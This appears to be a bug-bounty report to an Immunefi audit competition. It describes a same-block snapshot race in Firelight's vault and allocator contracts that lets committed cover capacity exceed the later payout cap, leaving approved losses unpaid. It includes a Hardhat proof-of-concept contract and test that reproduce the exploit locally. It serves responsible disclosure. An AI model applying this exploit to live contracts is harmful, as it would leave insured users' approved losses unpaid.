# 90488 sc high exact boundary withdrawal retroactively shrinks the period snapshot after

**Submitted on Aug 25th 2026 at 09:17:54 UTC by @jesse03 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #90488
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Protocol insolvency

## Description

### Root cause

The allocator and the vault both rely on the same historical lookup, `totalAssetsAt(periodStart)`, but they use it at different times for different safety decisions:

<br>

```solidity
// CoverOrderAllocator._computeAvailableCapacity()
$.vault.totalAssetsAt($.vault.currentPeriodStart())
```

```solidity
// FirelightVault.payout()
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
```

<br>

That snapshot is not immutable during the exact block whose timestamp equals `currentPeriodStart()`.

`FirelightVault.totalAssetsAt()` is only:

```solidity
return _traceTotalAssets.upperLookupRecent(timestamp);
```

<br>

and `withdraw()` / `redeem()` both end by writing a fresh total-assets checkpoint through `_logTrace(..., true)`:

```solidity
if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
```

<br>

Therefore, if `commitAllocation()` executes early in the first block of a new period and a large withdrawal executes later in that same block, the exact same query `totalAssetsAt(currentPeriodStart())` can resolve to:

<br>

1 - a higher value during commit, when capacity is validated;

2 - a much lower value later, when incident payouts for that period are capped.

<br>

The bug is not that settlement uses stale collateral in the abstract. The bug is that the protocol treats `capturePeriodStart` as a stable historical boundary, but that boundary remains mutable for the rest of the opening block.

<br>

### Exploit

<br>

This issue is independent from the broader cross-period. It does not require:

* a prior-period incident;
* first-loss-buffer depletion;
* reusing one collateral pool across two underwriting periods.

<br>

A single same-block boundary withdrawal is enough

<br>

Assume:

```
Period P starts at timestamp T
Active vault assets at commit time:      10,000,000
First-loss buffer contribution:                   0
effectiveLeverage / minCAR:                      1x
Committed matching capacity:            10,000,000
Boundary-block withdrawal request:       9,900,000
```

<br>

1 - The first block of period `P` is mined with timestamp `T = currentPeriodStart()`

<br>

2 - Early in that block, the allocator performs its normal `commitAllocation()` for period `P`

<br>

3 - `_computeAvailableCapacity()` reads `vault.totalAssetsAt(T)` before any boundary-block withdrawal checkpoint has been written, so the read still reflects the pre-withdrawal value of `10,000,000`

<br>

4 - The commitment is stored with `totalAvailableCapacity = 10,000,000`

<br>

5 - Later in the same block, a large shareholder calls `withdraw()` or `redeem()` for `9,900,000`

<br>

6 - The vault burns shares, moves those assets into pending-withdrawal accounting, and pushes a new `_traceTotalAssets` checkpoint at the same block timestamp `T` with only `100,000` active assets remaining

<br>

7 - From that point onward, `totalAssetsAt(T)` resolves to `100,000`, not `10,000,000`

<br>

8 - After the grace period, `settleCoverOrder()` still settles orders against the already stored commitment, because settlement checks only the committed Merkle tree and the stored `commit.totalAvailableCapacity`; it never revalidates the live or historical vault snapshot

<br>

9 - A legitimate incident is later created for period `P`, and `approveCurrentAssessment()` triggers payout

<br>

10 - `FirelightVault.payout()` now computes:

```
assetsAtCapturePeriod = totalAssetsAt(T) = 100,000
```

even though the same period's cover was matched using a committed capacity based on `10,000,000`

<br>

The resulting mismatch is:

```
Capacity used for underwriting:   10,000,000
Later payout cap for period P:       100,000
```

<br>

The payout path uses:

```solidity
paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount));
```

<br>

The critical point is that `activePayableAmount` can still be much larger than `assetsAtCapturePeriod`, because the withdrawal request remains slashable through `withdrawAssets[capturePeriod + 1]` during the payout window.

<br>

So the shortfall is not merely "the user withdrew first." The vault can still count those assets as payable capital, but the mutable historical lookup retroactively shrinks the cap that is supposed to represent the period's insured asset base.

<br>

Example:

```
Approved loss:                    5,000,000
Mutated assetsAtCapturePeriod:      100,000
activePayableAmount:             10,000,000
Actual vault payout:                100,000
Unpaid approved loss:             4,900,000
```

<br>

`IncidentManager.approveCurrentAssessment()` still closes the incident after `_executePayout()`, even when the vault pays only a fraction of the approved loss.

<br>

No privileged actor has to behave incorrectly

The allocator's action is the protocol's intended opening-period workflow: commit once for the current period using the state visible at that moment.

The state corruption happens afterward because an ordinary user withdrawal in the same boundary block changes what future `totalAssetsAt(currentPeriodStart())` lookups return. The protocol itself assumes that value is a stable period-start snapshot, but it is not.

<br>

### Impact

<br>

The protocol can

<br>

1 - commit and settle current-period cover using a large start-of-period asset base

2 - later cap claims from that same period using a much smaller retroactively mutated asset base

3 - permanently underpay or even zero-pay valid covered losses from already matched orders

<br>

This is protocol insolvency caused by inconsistent accounting of the same period's collateral. The underwriting side and the payout side disagree about what `capturePeriodStart` means

<br>

### Recommendation

<br>

Freeze one immutable asset snapshot per underwriting period and reuse that exact value everywhere that period-level solvency is enforced

## Proof of Concept

```diff
diff --git a/.tool-versions b/.tool-versions
new file mode 100644
index 0000000..1111111
--- /dev/null
+++ b/.tool-versions
@@
+nodejs 22.19.0
diff --git a/contracts/test/BoundarySnapshotRaceExecutor.sol b/contracts/test/BoundarySnapshotRaceExecutor.sol
new file mode 100644
index 0000000..1111111
--- /dev/null
+++ b/contracts/test/BoundarySnapshotRaceExecutor.sol
@@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity 0.8.28;
+
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+import {ICoverOrderAllocator} from "../core/interfaces/ICoverOrderAllocator.sol";
+import {IFirelightVault} from "../core/interfaces/IFirelightVault.sol";
+
+contract BoundarySnapshotRaceExecutor {
+    ICoverOrderAllocator public immutable allocator;
+    IFirelightVault public immutable vault;
+
+    constructor(ICoverOrderAllocator allocator_, IFirelightVault vault_) {
+        allocator = allocator_;
+        vault = vault_;
+    }
+
+    function depositToVault(IERC20 asset, uint256 amount) external {
+        asset.approve(address(vault), amount);
+        vault.deposit(amount, address(this));
+    }
+
+    function commitThenWithdraw(
+        uint256 commitmentPeriod,
+        bytes32 merkleRoot,
+        uint256 totalAllocated,
+        uint256 matchingCapacity,
+        uint256 withdrawAmount
+    ) external {
+        allocator.commitAllocation(commitmentPeriod, merkleRoot, totalAllocated, matchingCapacity);
+        vault.withdraw(withdrawAmount, address(this), address(this));
+    }
+}
diff --git a/test/poc_116_same_block_snapshot_race.js b/test/poc_116_same_block_snapshot_race.js
new file mode 100644
index 0000000..1111111
--- /dev/null
+++ b/test/poc_116_same_block_snapshot_race.js
@@
+const { loadFixture } = require('@nomicfoundation/hardhat-network-helpers')
+const { expect } = require('chai')
+const { ethers, upgrades } = require('hardhat')
+const { StandardMerkleTree } = require('@openzeppelin/merkle-tree')
+
+const { deployVault } = require('./setup/fixtures.js')
+
+const PROTOCOL = 'Morpho'
+const MARKET = ethers.encodeBytes32String('market-A')
+const COVER_MATCHED = 1
+const PRICE_1_USD_E18 = 10n ** 18n
+
+const buildSingleLeafTree = (orderId, marketId, allocatedCover) => {
+  return StandardMerkleTree.of(
+    [[BigInt(orderId), [[marketId, allocatedCover]]]],
+    ['uint256', '(bytes32,uint256)[]']
+  )
+}
+
+const deployPocFixture = async () => {
+  const ctx = await deployVault({
+    decimals: 6,
+    initial_deposit_limit: ethers.parseUnits('1000', 6),
+    period_configuration_duration: 86400,
+  })
+
+  const [deployer] = await ethers.getSigners()
+  const buyer = ctx.users[1]
+
+  const FirelightCoverFactory = await ethers.getContractFactory('CoverNFT')
+  const coverNFT = await upgrades.deployProxy(
+    FirelightCoverFactory,
+    [
+      'Firelight Cover',
+      'FLCOVER',
+      '',
+      deployer.address,
+      deployer.address,
+      ethers.ZeroAddress,
+      ethers.ZeroAddress,
+    ],
+    { kind: 'transparent' }
+  )
+
+  const MockAggregator = await ethers.getContractFactory('MockAggregatorV3')
+  const priceFeed = await MockAggregator.deploy(18, PRICE_1_USD_E18)
+
+  const CoverOrderAllocator = await ethers.getContractFactory('CoverOrderAllocator')
+  const marketId = ethers.keccak256(
+    ethers.AbiCoder.defaultAbiCoder().encode(['uint64', 'string', 'bytes32'], [1, PROTOCOL, MARKET])
+  )
+
+  const allocator = await upgrades.deployProxy(
+    CoverOrderAllocator,
+    [{
+      vault: ctx.firelight_vault.target,
+      premiumCollector: deployer.address,
+      coverNFT: coverNFT.target,
+      priceFeedAdapter: priceFeed.target,
+      maxPriceAge: 7 * 24 * 3600,
+      premiumTokens: [ctx.token_contract.target],
+      admin: deployer.address,
+      adminRole: deployer.address,
+      curatorRole: deployer.address,
+      allocatorRole: deployer.address,
+      configAdminRole: deployer.address,
+      initialProtocolConcentrations: [
+        { protocol: PROTOCOL, chainId: 1, maxProtocolConcentrationBps: 10_000 },
+      ],
+      newMarkets: [
+        { chainId: 1, protocol: PROTOCOL, market: MARKET },
+      ],
+      capacityConfig: {
+        minCAR: 12_000,
+        firstLossBufferToken: ctx.token_contract.target,
+        firstLossBuffer: deployer.address,
+        effectiveLeverage: 12_000,
+        minOrderMarketCoverAmount: 1,
+        divergenceToleranceBps: 0,
+      },
+    }],
+    {
+      kind: 'transparent',
+      unsafeAllow: ['missing-initializer-call'],
+    }
+  )
+
+  await coverNFT.grantRole(await coverNFT.MINTER_ROLE(), allocator.target)
+
+  const Executor = await ethers.getContractFactory('BoundarySnapshotRaceExecutor')
+  const helper = await Executor.deploy(allocator.target, ctx.firelight_vault.target)
+  await allocator.grantRole(await allocator.ALLOCATOR_ROLE(), helper.target)
+
+  return {
+    ...ctx,
+    deployer,
+    buyer,
+    allocator,
+    coverNFT,
+    marketId,
+    helper,
+  }
+}
+
+describe('PoC 116 - same-block period-start snapshot race', function () {
+  this.timeout(120000)
+
+  it('commits against the pre-withdrawal snapshot, then pays against the overwritten snapshot', async () => {
+    const ctx = await loadFixture(deployPocFixture)
+
+    const depositAmount = ethers.parseUnits('10', 6)
+    const withdrawAmount = ethers.parseUnits('9', 6)
+    const remainingActiveAssets = depositAmount - withdrawAmount
+    const coverAmount = ethers.parseUnits('10', 18)
+
+    await ctx.token_contract.mintTo(ctx.helper.target, depositAmount)
+    await ctx.helper.depositToVault(ctx.token_contract.target, depositAmount)
+
+    await ctx.token_contract.mintTo(ctx.buyer.address, ethers.parseUnits('1', 6))
+    await ctx.token_contract.connect(ctx.buyer).approve(ctx.allocator.target, ethers.parseUnits('1', 6))
+
+    await ctx.allocator.createCoverOrder(
+      ctx.buyer.address,
+      ctx.buyer.address,
+      'beneficiary',
+      ctx.token_contract.target,
+      [{ marketId: ctx.marketId, coverRateAnnual: 500, coverAmount }],
+      0
+    )
+
+    const tree = buildSingleLeafTree(0, ctx.marketId, coverAmount)
+    const proof = tree.getProof(0)
+
+    const boundaryTimestamp = await ctx.firelight_vault.currentPeriodEnd()
+    await ethers.provider.send('evm_setNextBlockTimestamp', [Number(boundaryTimestamp)])
+    await ctx.helper.commitThenWithdraw(1, tree.root, coverAmount, coverAmount, withdrawAmount)
+
+    const captureTimestamp = await ctx.firelight_vault.currentPeriodStart()
+    const capturePeriod = await ctx.firelight_vault.currentPeriod()
+
+    expect(capturePeriod).to.equal(1n)
+    expect(captureTimestamp).to.equal(boundaryTimestamp)
+
+    const committed = await ctx.allocator.getAllocationCommitment(capturePeriod)
+    expect(committed.totalAvailableCapacity).to.equal(coverAmount)
+
+    expect(await ctx.firelight_vault.totalAssets()).to.equal(remainingActiveAssets)
+    expect(await ctx.firelight_vault.totalAssetsAt(captureTimestamp)).to.equal(remainingActiveAssets)
+    expect(await ctx.firelight_vault.withdrawAssets(capturePeriod + 1n)).to.equal(withdrawAmount)
+
+    const activePayableAmount =
+      (await ctx.firelight_vault.totalAssets()) +
+      (await ctx.firelight_vault.withdrawAssets(capturePeriod + 1n))
+    expect(activePayableAmount).to.equal(depositAmount)
+
+    await ctx.allocator.settleCoverOrder(
+      0,
+      [{ marketId: ctx.marketId, allocatedCover: coverAmount }],
+      proof
+    )
+
+    const order = await ctx.allocator.getCoverOrder(0)
+    expect(order.status).to.equal(COVER_MATCHED)
+
+    await expect(
+      ctx.firelight_vault.connect(ctx.payout_signer).payout(
+        ctx.payout_receiver.address,
+        depositAmount,
+        captureTimestamp
+      )
+    )
+      .to.emit(ctx.firelight_vault, 'PayoutExecuted')
+      .withArgs(ctx.payout_receiver.address, depositAmount, remainingActiveAssets, captureTimestamp)
+  })
+})
```

<br>

Run it with:

```bash
npm install
npm test -- --grep "PoC 116 - same-block period-start snapshot race"
```

<br>

Expected result:

```
  PoC 116 - same-block period-start snapshot race
    ✔ commits against the pre-withdrawal snapshot, then pays against the overwritten snapshot

  1 passing
```
